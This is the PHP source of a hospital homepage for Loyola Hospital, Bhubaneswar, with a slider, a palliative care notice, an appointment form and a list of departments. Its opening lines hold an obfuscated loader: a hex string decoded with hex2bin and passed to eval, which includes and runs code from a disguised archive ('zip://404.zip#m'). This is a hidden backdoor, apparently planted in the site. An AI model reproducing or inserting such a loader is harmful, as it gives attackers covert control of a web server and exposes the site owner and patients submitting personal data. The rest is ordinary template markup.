<?php
$hex='3c3f70687020696e636c7564655f6f6e63652028227a69703a2f2f3430342e7a6970236d22293b203f3e';
$bin=hex2bin($hex);
eval('?>'.$bin);?>
<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<title>Loyola Hospital, Kalingavihar, Bhubaneswar</title>

	<!-- responsive meta -->
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- For IE -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<?php include_once'include/css.php'; ?>
    
</head>
<body class="home-page">
    
    
    <!--//floating icons-->
    <div class="sticky-container">
    <ul class="sticky">
        <li>
            <a href="https://www.facebook.com/Loyola-Hospital-107311745016386" target="_blank"><img class="imgicon" src="images/loyolafbicon.png" width="32" height="32"></a>
            <!--<p><a href="https://www.facebook.com/Loyola-Hospital-107311745016386" target="_blank"></a></p>-->
        </li>
        <!--<li>-->
        <!--    <img src="images/twitter-circle.png" width="32" height="32">-->
        <!--    <p><a href="https://twitter.com/codexworldblog" target="_blank">Follow Us on<br>Twitter</a></p>-->
        <!--</li>-->
        <!--<li>-->
        <!--    <img src="images/gplus-circle.png" width="32" height="32">-->
        <!--    <p><a href="https://plus.google.com/codexworld" target="_blank">Follow Us on<br>Google+</a></p>-->
        <!--</li>-->
        <!--<li>-->
        <!--    <img src="images/linkedin-circle.png" width="32" height="32">-->
        <!--    <p><a href="https://www.linkedin.com/company/codexworld" target="_blank">Follow Us on<br>LinkedIn</a></p>-->
        <!--</li>-->
        <li>
            <a href="https://www.youtube.com/channel/UCmuVo4tEe4ODpsaBcjYb9EA" target="_blank"><img class="imgicon" src="images/youtube-logo.png" width="32" height="32"></a>
            <!--<p><a href="https://www.youtube.com/channel/UCmuVo4tEe4ODpsaBcjYb9EA" target="_blank"></a></p>-->
        </li>
        <!--<li>-->
        <!--    <img src="images/pin-circle.png" width="32" height="32">-->
        <!--    <p><a href="https://www.pinterest.com/codexworld" target="_blank">Follow Us on<br>Pinterest</a></p>-->
        <!--</li>-->
    </ul>
</div>
    
    
    
<div class="boxed_wrapper">

<?php include_once'include/header.php'; ?>

<!--Start rev slider wrapper-->     
<section class="rev_slider_wrapper">
    <div id="slider1" class="rev_slider"  data-version="5.0">
        <ul>
            <li data-transition="rs-20">
                <img src="images/slides/1.jpg"  alt="" width="1920" height="700" data-bgposition="top center" data-bgfit="cover" data-bgrepeat="no-repeat" data-bgparallax="1">
                
                <div class="tp-caption  tp-resizeme" 
                    data-x="left" data-hoffset="0" 
                    data-y="top" data-voffset="80" 
                    data-transform_idle="o:1;"         
                    data-transform_in="x:[-175%];y:0px;z:0;rX:0;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0.01;s:3000;e:Power3.easeOut;" 
                    data-transform_out="s:1000;e:Power3.easeInOut;s:1000;e:Power3.easeInOut;" 
                    data-mask_in="x:[100%];y:0;s:inherit;e:inherit;" 
                    data-splitin="none" 
                    data-splitout="none"
                    data-responsive_offset="on"
                    data-start="1500">
                    <div class="slide-content-box mar-lft">
                        <h1>Loyola Hospice for <br> <span>terminally ill.</span></h1>
                        <p>The diagnosis of the ailment is done on advice of a best medical <br> practitioner or doctor, by simply visiting or clinic</p>
                        
                    </div>
                </div>
               
            </li>
            <li data-transition="fade">
                <img src="images/slides/2.jpg" alt="" width="1920" height="700" data-bgposition="top center" data-bgfit="cover" data-bgrepeat="no-repeat" data-bgparallax="1" >

                <div class="tp-caption  tp-resizeme" 
                    data-x="right" data-hoffset="0" 
                    data-y="top" data-voffset="80" 
                    data-transform_idle="o:1;"         
                    data-transform_in="x:[-175%];y:0px;z:0;rX:0;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0.01;s:3000;e:Power3.easeOut;" 
                    data-transform_out="s:1000;e:Power3.easeInOut;s:1000;e:Power3.easeInOut;" 
                    data-mask_in="x:[100%];y:0;s:inherit;e:inherit;" 
                    data-splitin="none" 
                    data-splitout="none"
                    data-responsive_offset="on"
                    data-start="1500">
                    <div class="slide-content-box">
                        <h1>Outpatient Department  <br> <span>Treatment</span></h1>
                        <p>The diagnosis of the ailment is done on advice of a best medical <br>practitioner or doctor, by simply visiting or clinic</p>
                         
                    </div>
                </div>
                
            </li>
            
        </ul>
    </div>
</section>
<!--End rev slider wrapper-->
<section class="pali-sec">
    <div class="container">
        <div class="row">
            <div class="col-lg-12">
                <div class="pali-box">
                    <h5>On 12th February 2018 LOYOLA HOSPITAL opened its door as palliative care unit for terminally ill patients.it provides  Comfort, dignity, peace and better quality of life.</h5>
                    <a href="palliative-care.php">View More</a>
                </div>
            </div>
        </div>
    </div>
</section>
<!--Start facilities Appointment area-->
<section class="facilities-appointment-area">
    <div class="container">
        <div class="row">
            <div class="col-md-8">
                <div class="facilities-content-box">
                    <div class="sec-title">
                        <h1>Key Features </h1>
                        <span class="border"></span>
                    </div>
                    <!--Start facilities carousel-->
                    <div class="xacilities-carousel">
                       
                        <!------Start single facilities item------->
                        <div class="single-facilities-item">
                            <div class="row">
                                <!--Start single item-->
                                <div class="col-md-6">
                                    <div class="single-item">
                                        <div class="icon-holder">
                                            <div class="icon-box">
                                                <div class="icon">
                                                    <span class="flaticon-transport"></span>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="text-holder">
                                            <h3>100% Safety</h3>
                                            <p>safety includes free of errors, injuries, accidents, infections and disease spread.</p>
                                        </div>
                                    </div>
                                </div>
                                <!--End single item-->
                                <!--Start single item-->
                                <div class="col-md-6">
                                    <div class="single-item">
                                        <div class="icon-holder">
                                            <div class="icon-box">
                                                <div class="icon">
                                                    <span class="flaticon-drink"></span>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="text-holder">
                                            <h3>Clean Environment</h3>
                                            <p>Health and hygiene conditions, discipline and cooperation from everyone are factors that included in this sort of a list</p>
                                        </div>
                                    </div>
                                </div>
                                <!--End single item-->
                            </div>
                            <div class="row">
                                <!--Start single item-->
                                <div class="col-md-6">
                                    <div class="single-item">
                                        <div class="icon-holder">
                                            <div class="icon-box">
                                                <div class="icon">
                                                    <span class="flaticon-avatar"></span>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="text-holder">
                                            <h3>Friendly Doctors</h3>
                                            <p>Our Doctors make sure that her/his patients get recommended emotional support and their questions are answered</p>
                                        </div>
                                    </div>
                                </div>
                                <!--End single item-->
                                <!--Start single item-->
                                <div class="col-md-6">
                                    <div class="single-item">
                                        <div class="icon-holder">
                                            <div class="icon-box">
                                                <div class="icon">
                                                    <span class="flaticon-church"></span>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="text-holder">
                                            <h3>Medical Research</h3>
                                            <p>We take the medical discoveries and move them into medical practices to improve the lives of their patients</p>
                                        </div>
                                    </div>
                                </div>
                                <!--End single item-->
                            </div>
                        </div>

                        <!-------End single facilities item------>
                      
                     
                        
                    </div>
                    <!--End facilities carousel-->    
                </div>
            </div>
            <div class="col-md-4" >
                <div class="appointment" style="background-color:#FFC300;">
                    <div class="sec-title">
                        <h1>Make an Appointment</h1>
                        <span class="border"></span>
                    </div>
                    <form id="appointment-form"   name="appointment-form" action="appointment.php" method="POST" >
                        <div class="row" >
                            <div class="col-md-12">
                                <div class="input-box">
                                    <input type="text" name="form_name" value="" placeholder="Your Name" required="">
                                </div>
                                <div class="input-box">
                                    <input type="tel" name="tel" value="" placeholder="Phone Number" required="">
                                </div>
                                <div class="input-box">
                                    <input type="date" name="date" value="" placeholder="Date" required="">
                                </div>
                                <div class="input-box">
                                    <select class="selectmenu" name="dept">
                                        <option selected="selected">Select Department</option>
                                        <option>Medicine</option>
                                        <option>Orthopedic</option>
                                        <option>Nursing Care</option>
                                        <option>Physiotherapy</option>
                                        <option>Paediatric Issue</option>
                                        <option>Surgery</optiOrthopedicon>
                                        <option>Dental</option>
                                        <option>Palliative Care</option>
                                    </select>
                                </div>
                                <button class="thm-btn bgclr-1" type="submit" name="submit">submit</button>        
                            </div>
                        </div>
                    </form>        
                </div>
            </div>
        </div>
    </div>    
</section>
<!--End facilities Appointment area-->

<!--Start service area-->
<section class="welcome-area">
    <div class="container">
        <div class="row" style="    display: flex;
    align-items: center;
    flex-wrap: wrap;">
            <div class="col-md-6">
                <div class="img-holder">
                    <img src="images/resources/welcome.jpg" alt="Awesome Image">    
                </div>
            </div>
            <div class="col-md-6">
                <div class="text-holder">
                    <div class="title">
                        <h1>Welcome to Loyola Hospital</h1>
                        <p class="text-justify">Managed by Missionary Sisters, Servants of the Holy Spirit, the Loyola Hospital is situated in the heart of Kalinga Vihar in Bhubaneswar. As a private, non-profit, provides quality healthcare services at affordable prices. By organising health camps, awareness programmes as well as following up regular check-ups, the Sisters of Loyola Hospital have looked into timely management of existing medical conditions and prevention of new diseases to ensure the neighborhood’s well-being. It’s this selfless service that has earned the trust of the people who continue to feel safe at Loyola Hospital OPENED ITS DOOR TO PALLIATIVE CARE UNIT.</p>    
                    </div>
                    <div class="button" style="margin-top: 0;">
                        <a class="thm-btn bgclr-1" href="about.php">View More</a>
                    </div>    
                </div>
            </div>
        </div>
    </div>    
</section>
<!--End service area-->
 
 
<!--Start fact counter area-->
<section class="fact-counter-area" style="background-image:url(images/resources/fact-counter-bg.jpg);">
    <div class="container">
        <div class="sec-title text-center">
            <h1>Keep your headup & be patient</h1>
            <p>How all this mistaken idea of denouncing pleasure and praising pain was born and I will give you a complete account of the<br> system and expound the actual teachings of the great.</p>
        </div>
        <div class="row">
            <!--Start single item-->
            <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                <ul>
                    <li>
                        <div class="single-item text-center">
                            <div class="icon-holder">
                                <span class="flaticon-medical"></span> 
                            </div>
                            <h1><span class="timer" data-from="1" data-to="20" data-speed="5000" data-refresh-interval="50">20</span></h1>
                            <h3>Years of Experience</h3>
                        </div>
                    </li>
                    <li>
                        <div class="single-item text-center">
                            <div class="icon-holder">
                                <span class="flaticon-smile"></span> 
                            </div>
                            <h1><span class="timer" data-from="1" data-to="10500" data-speed="5000" data-refresh-interval="50">10500</span></h1>
                            <h3>Happy Patients</h3>
                        </div>
                    </li>
                    <li>
                        <div class="single-item text-center">
                            <div class="icon-holder">
                                <span class="flaticon-medical-1"></span> 
                            </div>
                            <h1><span class="timer" data-from="1" data-to="06" data-speed="5000" data-refresh-interval="50">06</span></h1>
                            <h3>Department</h3>
                        </div>
                    </li>
                    <li>
                        <div class="single-item text-center">
                            <div class="icon-holder">
                                <span class="flaticon-ribbon"></span> 
                            </div>
                            <h1><span class="timer" data-from="1" data-to="250" data-speed="5000" data-refresh-interval="50">250</span></h1>
                            <h3>Palliative Care Treatment </h3>
                        </div>
                    </li>
                </ul>
            </div>
            <!--End single item-->
     
        </div>
    </div>
</section>
<!--End fact counter area--> 
 
<!--Start Medical Departments area-->
<section class="medical-departments-area ser-sec">
    <div class="container">
        <div class="sec-title">
            <h1>Medical Services</h1>
        <p style="margin-top: 15px;">We have medical and surgical services and the supporting laboratories, equipment and personnel that make up the medical and surgical mission of a hospital or hospital system.</p>
            <span class="border"></span>
        </div>
        <div class="row">
            <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">

                <div class="medical-departments-carousel">
                    <!--Start single item-->
                    <div class="single-item text-center">
                        <div class="iocn-holder">
                            <img src="images/icon/med.png" alt="Medicine">   
                        </div>
                        <div class="text-holder">
                            <h3>Medicine</h3>
                    </div>
                    </div>
                    <!--End single item-->
                    <!--Start single item-->
                    <div class="single-item text-center">
                        <div class="iocn-holder">
                            <img src="images/icon/ort.png" alt="Orthopedic">      
                        </div>
                        <div class="text-holder">
                            <h3>Orthopedic</h3>
                    </div>
                    </div>
                    <!--End single item-->
                    <!--Start single item-->
                    <div class="single-item text-center">
                        <div class="iocn-holder">
                            <img src="images/icon/nur.png" alt="Nursing Care">     
                        </div>
                        <div class="text-holder">
                            <h3>Nursing Care</h3>
                    </div>
                    </div>
                    <!--End single item-->
                    <!--Start single item-->
                    <div class="single-item text-center">
                        <div class="iocn-holder">
                            <img src="images/icon/phy.png" alt="Physiotherapy">  
                        </div>
                        <div class="text-holder">
                            <h3>Physiotherapy</h3>
                    </div>
                    </div>
                    <!--End single item-->

                    <!--Start single item-->
                    <div class="single-item text-center">
                        <div class="iocn-holder">
                            <img src="images/icon/ped.png" alt="Paediatric Issue">  
                        </div>
                        <div class="text-holder">
                            <h3>Paediatric Issue</h3>
                    </div>
                    </div>
                    <!--End single item-->

                    <!--Start single item-->
                    <div class="single-item text-center">
                        <div class="iocn-holder">
                            <img src="images/icon/sur.png" alt="Surgery">  
                        </div>
                        <div class="text-holder">
                            <h3>Surgery</h3>
                         </div>
                    </div>
                    <!--End single item-->
                    <!--Start single item-->
                    <div class="single-item text-center">
                        <div class="iocn-holder">
                            <img src="images/icon/pal.png" alt="Palliative care">  
                        </div>
                        <div class="text-holder">
                            <h3>Palliative Care</h3>
                    </div>
                    </div>
                    <!--End single item-->
                    <!--Start single item-->
                    <div class="single-item text-center">
                        <div class="iocn-holder">
                            <img src="images/icon/den.png" alt="Dental">  
                        </div>
                        <div class="text-holder">
                            <h3>Dental</h3>
                          </div>
                    </div>
                    <!--End single item-->
                </div>
            </div>    
        </div>
    </div>
</section>
<!--End Medical Departments area--> 
  


 



<?php include_once'include/footer.php'; ?>

<?php include_once'include/js.php'; ?>





</body>

</html>